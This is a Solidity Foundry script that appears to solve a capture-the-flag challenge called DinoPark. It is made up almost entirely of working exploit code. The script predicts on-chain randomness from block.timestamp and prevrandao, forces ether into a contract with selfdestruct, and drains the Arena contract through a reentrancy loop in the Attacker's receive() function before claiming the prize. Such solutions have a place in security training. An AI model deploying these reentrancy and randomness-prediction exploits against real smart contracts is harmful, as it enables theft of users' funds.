// script/Solve.s.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Script.sol";

// --- All necessary contracts and interfaces ---

interface IArena {
    function fight(uint8 guess, uint8 mode) external;
}

interface IDinoPark {
    function claimGoldenEgg() external;
    function arena() external view returns (address);
}

contract Funder {
    constructor(address payable _target) payable {
        selfdestruct(_target);
    }
}

contract Attacker {
    IArena public immutable arena;
    IDinoPark public immutable dinoPark;
    uint256 public reentrancyCounter = 0;
    uint8 public luckyRoll;

    constructor(address _arena, address _dinoPark) {
        arena = IArena(_arena);
        dinoPark = IDinoPark(_dinoPark);
    }

    function pwn() external {
        luckyRoll = uint8(uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % 100);
        require(luckyRoll > 30, "Bad roll, try again in the next block.");
        arena.fight(luckyRoll, 0);
    }

    function claim() external {
        dinoPark.claimGoldenEgg();
    }

    receive() external payable {
        if (reentrancyCounter < 5) {
            reentrancyCounter++;
            arena.fight(luckyRoll, 0);
        }
    }
}

// --- The All-in-One Script ---
contract SolveScript is Script {
    function run() external {
        // Get addresses from your environment variables
        address dinoParkAddr = vm.envAddress("DINO_PARK_ADDR");
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address arenaAddr = IDinoPark(payable(dinoParkAddr)).arena();

        vm.startBroadcast(deployerPrivateKey);

        // Step 1: Fund the Arena
        new Funder{value: 0.1 ether}(payable(arenaAddr));

        // Step 2 & 3: Deploy Attacker, become champion, drain, and claim the egg
        Attacker attacker = new Attacker(arenaAddr, dinoParkAddr);
        attacker.pwn{gas: 2_000_000}();
        attacker.claim();

        vm.stopBroadcast();
    }
}